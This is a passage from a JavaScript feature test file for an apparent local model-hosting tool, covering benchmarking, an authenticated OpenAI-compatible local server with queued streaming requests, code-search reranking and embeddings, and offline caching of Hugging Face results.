	const o = await benchmarkModel(`http://127.0.0.1:${plain.address().port}/v1`, 'qwen2.5-coder:7b', { backend: 'ollama' });
	assert.ok(o.tokS > 20 && o.tokS < 250 && o.ttftMs === undefined && o.backend === 'ollama', 'wall-clock speed: ' + o.tokS);
	await close(plain);
	const down = await benchmarkModel('http://127.0.0.1:9/v1', 'm');
	assert.ok(down.error && down.checks.length === 0 && down.score === 0, 'an engine that does not answer: no checks run');
});

test('Local Host: key required, models listed, engine requests queued and streamed, unknown models refused', async () => {
	const { LocalHostServer, routeFor, authorized, newKey } = require(OUT + '/localHostServer.js');
	assert.strictEqual(routeFor('/v1/chat/completions', 'POST'), 'chat');
	assert.strictEqual(routeFor('/v1/models', 'GET'), 'models');
	assert.strictEqual(routeFor('/v1/chat/completions', 'GET'), undefined);
	assert.ok(authorized({ authorization: 'Bearer k'.padEnd(25, 'x') }, 'k'.padEnd(23, 'x')) === false);
	const key = newKey();
	assert.ok(/^zk-[\w-]{20,}$/.test(key) && authorized({ authorization: 'Bearer ' + key }, key) && authorized({ 'x-api-key': key }, key) && !authorized({}, key));
	// A fake engine that streams two chunks slowly; records the order requests reach it.
	const seen = [];
	const engine = await listen((req, res) => {
		let body = '';
		req.on('data', (c) => (body += c));
		req.on('end', () => {
			seen.push('start ' + JSON.parse(body).model);
			res.writeHead(200, { 'Content-Type': 'text/event-stream' });
			res.write('data: {"choices":[{"delta":{"content":"Hel"}}]}\n\n');
			setTimeout(() => {
				res.end('data: {"choices":[{"delta":{"content":"lo"}}]}\n\ndata: [DONE]\n\n');
				seen.push('end ' + JSON.parse(body).model);
			}, 80);
		});
	});
	const loads = [];
	const host = new LocalHostServer({
		models: async () => ({ engine: ['a', 'b'], ollama: [] }),
		ensureEngine: async (model) => (loads.push(model), engine.address().port),
		ollamaBase: () => 'http://127.0.0.1:9/v1',
		embedPort: async () => undefined,
		onActivity: () => {}
	});
	await host.start({ enabled: true, port: 0, lan: false, key });
	const port = host.server?.address?.().port ?? host['server'].address().port;
	const url = `http://127.0.0.1:${port}/v1`;
	const H = { Authorization: 'Bearer ' + key, 'Content-Type': 'application/json' };
	assert.strictEqual((await fetch(url + '/models')).status, 401);
	assert.deepStrictEqual((await (await fetch(url + '/models', { headers: H })).json()).data.map((d) => d.id), ['a', 'b', 'engine/a', 'engine/b']);
	const ask = (model) => fetch(url + '/chat/completions', { method: 'POST', headers: H, body: JSON.stringify({ model, stream: true, messages: [] }) }).then((r) => r.text());
	const [ra, rb] = await Promise.all([ask('a'), ask('b')]);
	assert.ok(ra.includes('Hel') && ra.includes('[DONE]') && rb.includes('lo'), 'streamed through');
	// Concurrent HTTP requests may arrive in either order; the engine must finish
	// the first before switching models for the second.
	const first = loads[0];
	const second = loads[1];
	assert.deepStrictEqual([...loads].sort(), ['a', 'b']);
	assert.deepStrictEqual(seen, ['start ' + first, 'end ' + first, 'start ' + second, 'end ' + second], 'model swaps wait for the active request to finish');
	assert.strictEqual((await fetch(url + '/chat/completions', { method: 'POST', headers: H, body: '{"model":"zzz"}' })).status, 404);
	assert.strictEqual((await fetch(url + '/chat/completions', { method: 'POST', headers: H, body: 'nope' })).status, 400);
	await host.stop();
	await close(engine);
});

test('private code search: rerank reorders the best hits; embeddings get task prefixes', async () => {
	const { rerankTexts, embedTexts } = require(OUT + '/tools/codeIndex.js');
	let got;
	const srv = await listen((req, res) => {
		let body = '';
		req.on('data', (c) => (body += c));
		req.on('end', () => {
			got = { url: req.url, body: JSON.parse(body) };
			res.setHeader('Content-Type', 'application/json');
			if (req.url.endsWith('/rerank')) return res.end(JSON.stringify({ results: [{ index: 2, relevance_score: 0.9 }, { index: 0, relevance_score: 0.4 }, { index: 7, relevance_score: 1 }] }));
			res.end(JSON.stringify({ data: got.body.input.map((_, i) => ({ index: i, embedding: [1, i] })) }));
		});
	});
	const base = `http://127.0.0.1:${srv.address().port}/v1`;
	assert.deepStrictEqual(await rerankTexts({ baseUrl: base, model: 'r' }, 'q', ['a', 'b', 'c']), [2, 0, 1], 'best first; out-of-range dropped; the rest keep their place');
	assert.deepStrictEqual(got.body, { model: 'r', query: 'q', documents: ['a', 'b', 'c'], top_n: 3 });
	const { EMBED_PREFIX, PRIVATE_MODELS } = require(OUT + '/localEmbed.js');
	assert.strictEqual(EMBED_PREFIX.query, 'search_query: ');
	assert.ok(PRIVATE_MODELS.embed.args.includes('--embedding') && PRIVATE_MODELS.rerank.args.includes('--reranking'));
	await embedTexts({ baseUrl: base, apiKey: '', model: 'e' }, ['search_query: hello']);
	assert.deepStrictEqual(got.body.input, ['search_query: hello']);
	await close(srv);
});

test('offline mode: Hugging Face answers are cached and served when the network is gone', async () => {
	const { hfCached, isOfflineError } = require(OUT + '/hfCache.js');
	const dir = path.join(tmp, 'hfc');
	const first = await hfCached(dir, 'search|q', async () => [{ id: 'x/y' }]);
	assert.deepStrictEqual([first.value, first.offline], [[{ id: 'x/y' }], undefined]);
	const offline = Object.assign(new TypeError('fetch failed'), { cause: { code: 'ENOTFOUND' } });
	assert.ok(isOfflineError(offline) && !isOfflineError(new Error('HTTP 404')));
	const again = await hfCached(dir, 'search|q', async () => { throw offline; });
	assert.deepStrictEqual([again.value, again.offline, typeof again.cachedAt], [[{ id: 'x/y' }], true, 'number']);
	await assert.rejects(hfCached(dir, 'search|never', async () => { throw offline; }), /offline/);
	await assert.rejects(hfCached(dir, 'search|q', async () => { throw new Error('HTTP 500'); }), /HTTP 500/, 'real server errors are not hidden');
});

// ------------------------------------------------------------------ run

let failed = 0;
(async () => {
	for (const [name, fn] of tests) {
		try {
			await fn();
			console.log('ok  ' + name);
		} catch (e) {
			failed++;
			console.error('FAIL ' + name + '\n', e);
		}
	}
	try { fs.rmSync(tmp, { recursive: true, force: true, maxRetries: 3 }); } catch {}
	console.log(failed ? `\n${failed} FEATURE TEST(S) FAILED` : '\nALL FEATURE TESTS PASSED');
	process.exitCode = failed ? 1 : 0;
})();
